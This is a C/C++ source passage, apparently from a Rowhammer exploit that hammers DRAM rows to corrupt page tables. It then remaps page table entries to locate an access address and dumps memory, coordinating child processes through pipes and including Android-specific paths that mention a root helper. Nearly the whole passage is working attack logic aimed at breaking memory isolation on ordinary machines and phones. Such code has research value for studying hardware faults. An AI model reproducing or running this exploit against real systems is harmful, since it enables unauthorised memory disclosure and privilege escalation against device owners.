  bool child_has_page_table = false;
  bool child_has_access_address = false;

  printf("Hammer the victim rows and check the mappings in parallel\n");
  // Now hammer the victim rows and check in parallel if we were successful
  int child_result = hammer_and_check(hammer_thread, thread_data, simulate,
                                      rows_vector, pipe_buf, iterations, 
                                      &page_table, &virtual_target, victim_positions);


  if (child_result == 2) {
    child_has_page_table = true;
    printf("MY CHILD FOUND A PAGE TABLE \\o/\n");

    strcpy(pipe_buf, "set_pte_to_next");
    write_to_children(pipe_buf, 16);
  }

  if (page_table) {        
    printf(COLOR_GREEN "C%d" COLOR_RESET " change entry 0 to entry 1 and find two consecutive pages "
           "with the same content\n", g_child_id);
    page_table[0] = page_table[1];
  }

  printf("find_access_address\n");

  strcpy(pipe_buf, "find_access_address");
  write_to_children(pipe_buf, 20);

  uint64_t *access_address = find_access_address(page_table, iterations);

  printf("Waiting for children\n");
  wait_for_children(pipe_buf, PIPE_BUF);
  printf("child returned %s\n", pipe_buf);

  if (strcmp(pipe_buf, "done1") == 0) {
    child_has_access_address = true;
    printf("MY CHILD FOUND THE ACCESS ADDRESS \\o/\n");
  }


  printf("page_table:     %10p\n"
         "access_address: %10p\n"
         "child_has_page_table:     %d\n"
         "child_has_access_address: %d\n",
         page_table, access_address, child_has_page_table, 
         child_has_access_address);

  if (page_table != nullptr && access_address != nullptr) {
    dump_memory(access_address, page_table, iterations);
  }
  else if (page_table != nullptr && child_has_access_address) {
    // give both to the child
    give_page_table_to_child(&page_table, iterations);

    // unmap
    for (int i = 1; i < iterations; i++) {
      munmap(g_file_mappings[i] , g_file_size);
    }

    strcpy(pipe_buf, "dump");
    write_to_children(pipe_buf, 5);

    printf("Waiting for children\n");
    wait_for_children(pipe_buf, PIPE_BUF);
  }
  else if (child_has_page_table && access_address != nullptr) {
    // give both to me, the host
    page_table = give_page_table_to_host(&access_address, iterations);

    write_to_children("unmap", 6);
    //printf("Asked child to unmap file mappings\n");  // This can cause a system crash
    wait_for_children(pipe_buf, PIPE_BUF);

    dump_memory(access_address, page_table, iterations);
  }
  else if (child_has_page_table && child_has_access_address) {
    // unmap
    for (int i = 1; i < iterations; i++) {
      munmap(g_file_mappings[i] , g_file_size);
    }

    strcpy(pipe_buf, "dump");
    write_to_children(pipe_buf, 5);

    printf("Waiting for children\n");
    wait_for_children(pipe_buf, PIPE_BUF);
  }
  else {
    printf("Did not successfully hammer any pages tables\n");
  }

  printf("done\n");

  //cat("/proc/meminfo");

  write_to_children("exit", 4);

  for (int i = 1; i < iterations; i++) {
    munmap(g_file_mappings[i] , g_file_size);
  }
  printf("unmapped file mappings successfully\n");

  return access_address != 0;
}


void sig_handler(int signo)
{
  printf(COLOR_GREEN "C%d" COLOR_RESET " received %d\n", g_child_id, signo);

  if (g_child_id > 0) {
    printf("child %d exiting\n", g_child_id);
    exit(0);
  }

  switch (signo) {
    case SIGINT:
    case SIGKILL:
    case SIGSEGV:
    case SIGTERM:
      kill_children();
  }

  for (int i = 0; i < g_child_count; i++) {
    if(g_child_pids[i] != 0) {
      int status;
      waitpid(g_child_pids[i], &status, 0);
    }
  }

  exit(1);
}


void sigsegv_handler(int signum, siginfo_t *info, void *context)
{
  struct sigaction action;
  action.sa_handler = SIG_DFL;
  action.sa_sigaction = NULL;
  sigemptyset(&action.sa_mask);
  action.sa_flags = 0;
  action.sa_restorer = NULL;
  

  fprintf(stderr, COLOR_GREEN "C%d" COLOR_RESET " Fault address: %p\n", g_child_id, info->si_addr);
  switch (info->si_code) {
  case SEGV_MAPERR:
    fprintf(stderr, "Address not mapped.\n");
    break;

  case SEGV_ACCERR:
    fprintf(stderr, "Access to this address is not allowed.\n");
    break;

  default:
    fprintf(stderr, "Unknown reason.\n");
    break;
  }

  /* unregister and let the default action occur */
  sigaction(SIGSEGV, &action, NULL);
}


int main(int argc, char *argv[]) {
  int ret;
  size_t mem_size = 0x200000UL * 300;
  uint8_t *page = nullptr;
  volatile uint8_t *aggr[4], *victim;
  uint8_t pattern = 0xaa;

#ifdef __ANDROID__
  printf("exploit starting\n");
  printf("don't forget to start root_helper\n");
  printf("shared file fd is %s\n", argv[1]);
  fflush(stdout);
#endif

  struct sigaction action;
  action.sa_handler = NULL;
  action.sa_sigaction = sigsegv_handler;
  sigemptyset(&action.sa_mask);
  action.sa_flags = SA_SIGINFO;
  action.sa_restorer = NULL;

  signal(SIGINT, sig_handler);
  signal(SIGKILL, sig_handler);
  signal(SIGTERM, sig_handler);
  
  srand(time(NULL));

  // Enable core dumps
  struct rlimit corelim;

  corelim.rlim_cur = RLIM_INFINITY;
  corelim.rlim_max = RLIM_INFINITY;

  if (setrlimit (RLIMIT_CORE, &corelim) != 0) {
    printf("Couldn't set core limit\n");
  }

#ifdef __ANDROID__
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);

  if (argc < 2) {
    printf("forgot cacheDirPath?\n");
    return 1;
  }
#endif

#ifndef __ANDROID__
  if (open_page_map() == -1)
    return errno;       
#endif

  if (argc > 2 && strcmp(argv[1], "child") == 0) {
    int read_pipe, write_pipe, temp_file_fd, child_id;
    uintptr_t victim_phys_addr;
    size_t temp_file_size;

    if (argc != 8) {
      printf("not 8 arguments!\n");
      exit(255);
    }
    
    // kill me when the parent dies
    prctl(PR_SET_PDEATHSIG, SIGTERM);

    sscanf(argv[2], "%d", &read_pipe);
    sscanf(argv[3], "%d", &write_pipe);
    sscanf(argv[4], "%d", &temp_file_fd);
    sscanf(argv[5], "%ld", &temp_file_size);
    sscanf(argv[6], "%ld", &victim_phys_addr);
    sscanf(argv[7], "%d", &child_id);

    exit(child_process(read_pipe, write_pipe, temp_file_fd, temp_file_size, victim_phys_addr, child_id));
  }


#ifndef __ANDROID__
#ifndef FLUSH
  if (ptedit_init())
  {
    std::cout << "couldn't init ptedit" << std::endl;
    std::cout << "run modprobe pteditor or compile with -DFLUSH" << std::endl;
		exit(255);
  }
#endif

  g_output_file = fopen("/dev/null", "w+");
  if (g_output_file == NULL) {
    printf("couldn't open addresses.csv %d %s\n", errno, strerror(errno));
    return 1;
  }
  fprintf(g_output_file, "y,color,addr,value\n"); 

  init_dev_mem();
#endif

#ifdef __ANDROID__
  //if (open_root_helper_pipes(argv[1]) == -1) {
  //  printf("open_root_helper_pipes failed %d %s\n", errno, strerror(errno));
  //  return errno;
  //}
#endif

  // get the memory where the function looks for bit flips
  volatile uint8_t *mem = (volatile uint8_t*) get_aligned_uncached_mem(mem_size);
  fflush(stdout);

  if ((void*) mem == MAP_FAILED)
    return 1;

#ifndef __ANDROID__
  exploit(mem, mem_size);
#else
  exploit(mem, mem_size, argv[2]);
#endif

  for (int i = 0; i < g_child_count; i++) {
    if(g_child_pids[i] != 0) {
      int status;
      waitpid(g_child_pids[i], &status, 0);
    }
  }

  return 0;
}